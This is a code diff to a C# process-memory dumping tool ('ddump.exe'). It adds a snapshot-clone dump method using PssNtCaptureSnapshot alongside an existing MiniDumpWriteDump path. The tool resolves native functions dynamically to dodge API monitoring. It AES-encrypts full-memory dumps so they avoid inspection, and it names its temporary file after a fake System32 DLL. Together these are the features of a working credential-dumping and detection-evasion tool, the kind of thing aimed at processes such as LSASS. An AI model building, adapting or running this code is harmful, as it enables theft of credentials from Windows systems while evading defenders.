@@ -4,8 +4,11 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using Microsoft.Win32.SafeHandles;
 using static Charles.STRUCTS;
+using static Charles.STRUCTS.PSS_CAPTURE_FLAGS;
+using static Charles.STRUCTS.PSS_QUERY_INFORMATION_CLASS;
 using System.Security.Cryptography;
 using System.Text;
+using DWORD = System.Int32;
 
 namespace Charles
 {
@@ -17,12 +20,59 @@ namespace Charles
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
 
-
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeFileHandle hFile, MINIDUMP_TYPE DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus PssNtCaptureSnapshot(out IntPtr SnapshotHandle, IntPtr hProcess, PSS_CAPTURE_FLAGS CaptureFlags, DWORD ThreadContextFlags);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus PssNtQuerySnapshot(IntPtr SnapshotHandle, PSS_QUERY_INFORMATION_CLASS InformationClass , out IntPtr Buffer, DWORD BufferLength);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus PssNtFreeSnapshot(IntPtr SnapshotHandle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus NtClose(IntPtr Handle);
     }
     public class STRUCTS
     {
+        public enum PSS_QUERY_INFORMATION_CLASS
+        {
+            PSS_QUERY_PROCESS_INFORMATION = 0,
+            PSS_QUERY_VA_CLONE_INFORMATION = 1,
+            PSS_QUERY_AUXILIARY_PAGES_INFORMATION = 2,
+            PSS_QUERY_VA_SPACE_INFORMATION = 3,
+            PSS_QUERY_HANDLE_INFORMATION = 4,
+            PSS_QUERY_THREAD_INFORMATION = 5,
+            PSS_QUERY_HANDLE_TRACE_INFORMATION = 6,
+            PSS_QUERY_PERFORMANCE_COUNTERS = 7
+        }
+
+        public enum PSS_CAPTURE_FLAGS : uint
+        {
+            PSS_CAPTURE_NONE = 0x00000000,
+            PSS_CAPTURE_VA_CLONE = 0x00000001,
+            PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
+            PSS_CAPTURE_HANDLES = 0x00000004,
+            PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
+            PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
+            PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
+            PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
+            PSS_CAPTURE_THREADS = 0x00000080,
+            PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
+            PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
+            PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
+            PSS_CAPTURE_VA_SPACE = 0x00000800,
+            PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
+            PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
+            PSS_CREATE_BREAKAWAY = 0x08000000,
+            PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
+            PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
+            PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
+            PSS_CREATE_RELEASE_SECTION = 0x80000000
+        }
+
         public enum MINIDUMP_TYPE : uint
         {
             MiniDumpNormal = 0x00000000,
@@ -68,7 +118,6 @@ namespace Charles
         {
             // Success
             Success = 0x00000000,
-            Wait0 = 0x00000000,
             Wait1 = 0x00000001,
             Wait2 = 0x00000002,
             Wait3 = 0x00000003,
@@ -666,13 +715,12 @@ namespace Charles
         public static void Main(string[] args)
         {
 
-            if (args.Length != 4)
+            if (args.Length != 5)
             {
-                Console.WriteLine("Usage: ddump.exe [process] [key] [iv] [destination]");
-                Console.WriteLine("Example: ddump.exe notepad 'AH!PSB5%FRHZ$UKA' 'HV$3pIjHR$3pDj1' C:\\temp\\poney.bin");
+                Console.WriteLine("Usage: ddump.exe [process] [key] [iv] [destination] [method: classic / snapshot]");
+                Console.WriteLine("Example: ddump.exe notepad 'AH!PSB5%FRHZ$UKA' 'HV$3pIjHR$3pDj1' C:\\temp\\poney.bin classic");
                 return;
             }
-
 
             //Setup AES key and IV
             string key = args[1];
@@ -680,30 +728,63 @@ namespace Charles
 
             //Which process to dump    
             Process process = Process.GetProcessesByName(args[0])[0];
+            IntPtr pHandle = process.Handle;
+            IntPtr cloneProcess = IntPtr.Zero;
+            IntPtr sHandle = IntPtr.Zero;
 
-            //Generate a minidump
-            byte[] dumpBytes = Dump(process);
+            if (args[4] == "classic")
+            {
+                //Generate a minidump
+                byte[] dumpBytes = Dump(process, pHandle);
+                //Encrypt the dump
+                byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);
+                // Write the encrypted data to a file
+                File.WriteAllBytes(args[3], encryptedDump);
+                return;
+            }
 
-            //Encrypt the dump
-            byte[] encryptedDump = EncryptBytes(dumpBytes, key , iv);
+            if (args[4] == "snapshot")
+            {
+                    //Create a snapshot
+                    Snapshot(process,out sHandle, out cloneProcess);
+                    Console.WriteLine($"Handle passed to the dump function :{cloneProcess}");
 
-            // Write the encrypted data to a file
-            File.WriteAllBytes(args[3], encryptedDump);
+                    //Generate a minidump
+                    byte[] dumpBytes = Dump(process, cloneProcess);
 
-            static byte[] Dump(Process process)
+                    //Encrypt the dump
+                    byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);                   
+
+                    // Write the encrypted data to a file
+                    File.WriteAllBytes(args[3], encryptedDump);
+
+                    //Free the snapshot
+                    IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
+                    DELEGATES.PssNtFreeSnapshot ntfree = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtFreeSnapshot)) as DELEGATES.PssNtFreeSnapshot;
+                    NtStatus status = ntfree(sHandle);
+
+                    //Close the cloned handle
+                    pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtClose");
+                    DELEGATES.NtClose ntclose = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtClose)) as DELEGATES.NtClose;
+
+                    ntclose(cloneProcess);
+                    return;
+            }
+
+            static byte[] Dump(Process process, IntPtr pHandle)
             {
                 using (MemoryStream memoryStream = new MemoryStream())
                 {
                     using (FileStream fs = new FileStream("C:\\Windows\\System32\\somedll.dll", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None, 4096, FileOptions.DeleteOnClose))
                     {
-                        
-                        
 
                         IntPtr pointer = Invoke.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump");
                         DELEGATES.MiniDumpWriteDump MDWD = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.MiniDumpWriteDump)) as DELEGATES.MiniDumpWriteDump;
 
 
-                        MDWD(process.Handle, process.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                        bool status = MDWD(pHandle, process.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                        Console.WriteLine($"MemoryDump Status :{status}");
+                     
 
                         fs.CopyTo(memoryStream);
                     }
@@ -713,6 +794,23 @@ namespace Charles
                 }
             }
 
+
+            static void Snapshot(Process process, out IntPtr sHandle, out IntPtr cloneProcess)
+            {
+                //Create snapshot and get a handle
+                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtCaptureSnapshot");
+                DELEGATES.PssNtCaptureSnapshot ntsnap = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtCaptureSnapshot)) as DELEGATES.PssNtCaptureSnapshot;
+
+                NtStatus status = ntsnap(out sHandle, process.Handle, PSS_CAPTURE_VA_CLONE, 0);
+
+                //Query the snapshot and get the cloned handle
+                pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtQuerySnapshot");
+                DELEGATES.PssNtQuerySnapshot ntquery = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtQuerySnapshot)) as DELEGATES.PssNtQuerySnapshot;               
+
+                status = ntquery(sHandle, PSS_QUERY_VA_CLONE_INFORMATION, out cloneProcess, IntPtr.Size);        
+                
+            }
+            
             static byte[] EncryptBytes(byte[] inputBytes, string key, string iv)
             {
                 using (Aes aesAlg = Aes.Create())
